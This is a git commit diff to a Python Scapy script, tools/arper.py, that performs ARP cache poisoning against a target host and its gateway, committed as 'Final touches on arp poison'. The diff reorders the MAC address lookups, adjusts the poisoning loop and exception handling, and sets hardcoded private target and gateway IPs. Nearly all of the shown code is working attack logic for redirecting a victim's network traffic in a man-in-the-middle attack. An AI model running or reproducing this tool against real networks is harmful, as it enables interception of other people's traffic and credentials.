b477863bb74f61e107620b147f20a73dd3789ca6
xander <jxandermorrison@gmail.com>
2020-05-11 22:28:59 -0400

    Final touches on arp poison

--- tools/arper.py
+++ tools/arper.py
@@ -4,7 +4,7 @@ import os, sys
 import threading
 import signal
 
-interface = "en1"
+interface = "eth0"
 target_ip = "172.16.224.130"
 gateway_ip = "172.16.224.2"
 packet_count = 1000
@@ -20,12 +20,11 @@ def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
     send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,
         hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
 
-    os.kill(os.getpid(), signal.SIGINT)
+    os.kill(os.getpid(), signal.SIGKILL)
 
 def get_mac(ip_address):
 
-    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),
-            timeout=2, retry=10)
+    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
 
     # return the MAC address from a response
     for s, r in responses:
@@ -57,11 +56,21 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
             time.sleep(2)
         except KeyboardInterrupt:
             restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+            break
 
     print "[*] ARP poison attack finished."
     return
 
 print "[*] Setting up %s" % interface
+
+
+target_mac = get_mac(target_ip)
+
+if target_mac is None:
+    print "[!] Failed to get target MAC. Exiting."
+    sys.exit(0)
+else:
+    print "[*] Target %s is at %s" % (target_ip, target_mac)
 
 gateway_mac = get_mac(gateway_ip)
 
@@ -71,13 +80,6 @@ if gateway_mac is None:
 else:
     print "[*] Gateway %s is at %s" % (gateway_ip, gateway_mac)
 
-target_mac = get_mac(target_ip)
-
-if target_mac is None:
-    print "[!] Failed to get target MAC. Exiting."
-    sys.exit(0)
-else:
-    print "[*] Gateway %s is at %s" % (target_ip, target_mac)
 
 
 poison_thread = threading.Thread(target=poison_target,
@@ -94,7 +96,6 @@ try:
 
     restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
 
-except KeyboardInterrupt:
+except:
     # restore the network
-    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
     sys.exit(0)
